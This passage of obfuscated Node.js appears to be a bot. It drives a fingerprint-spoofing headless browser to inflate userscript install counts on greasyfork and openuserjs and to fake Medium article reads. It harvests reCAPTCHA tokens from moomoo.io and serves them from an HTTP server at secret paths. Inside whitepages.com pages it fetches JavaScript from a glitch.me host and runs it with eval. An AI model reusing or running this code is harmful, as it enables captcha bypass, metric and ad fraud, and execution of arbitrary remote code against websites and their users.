      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + X(0x4, 'e7xc'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + W(0x5) + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + X(0x19, '3b0R') + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0x1f)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + Y(0x9) + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + X(0x1e, 'yirg') + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + X(0xf, '!4xl')
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + X(0x8, 'QZ66') + 'ca119188bd',
    'https://me' + 'dium.com/e' + X(0xa, '5I8@') + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + W(0x15) + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + W(0x1a),
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + Y(0x0),
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + Y(0x20) + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1e03 + 0x1d * -0x17 + -0x32 * -0xa7
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x239f + -0x1fb8 + -0x1 * -0x4357)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x38c * -0x6 + -0x2458 + 0x13c * 0x2f), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1268 + 0x2492 + 0x89 * -0x66), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1888 + 0x174e + -0x2fd6;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1d1 + 0x1a * 0x4e + -0x9bd; w < getRandomInt(0x2187 + -0x26de + -0x8 * -0xab, 0xf * 0x18a + 0x377 + 0x3 * -0x8d8); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1 * -0x4361 + -0xbc9c * -0x2 + -0x4b77);
        }
      }();
    }, 0x7 * 0x26b + -0x12b2 * 0x1 + 0x7 * 0x4f), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1 * -0x39a + -0x916 + -0x32c * -0x4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xfe3 + 0x3c * -0x23 + -0x7af * 0x1, -0x1ef8 + -0x7 * -0x377 + 0x3d * 0x1d)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x3a * -0x6d + -0x2325 * -0x1 + 0x3959);
    }, 0x1 * -0xeae + -0x220 + 0x1132), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x1cd3 + -0x253f + 0x31 * 0x2c;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x192d + -0xb2 + 0x2597), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1aea + 0xb49 + 0xfa1), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xd65bb * -0x1 + -0x27a * -0x14c + -0x2e053);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x123 * -0x6 + 0x2 * 0x851 + -0x7b0 * 0x3);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x1a2c + -0x51c + 0x130 * 0x1b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2 * 0x17c5 + 0x24fe + -0x34f8);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = b;
  async function f() {
    const Z = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x2f1 * 0x2 + -0x1 * 0x1834 + 0x1 * 0x1e17) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x2 * 0xeda + -0x1453 + -0x960));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x177c + 0x389 * -0x4 + 0x38 * 0xac, D['indexOf']('\x20'));
        return B ? E['slice'](-0x42d * 0x6 + 0x25 * -0x1 + 0x1933, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x45cb + 0x2561 * -0x1 + 0x6a6),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': Z(0x1),
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object[Z(0xe)](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x216 * -0xa + -0x3 * -0x3bb + 0x703),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + a0(0xb, 'e7xc') + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
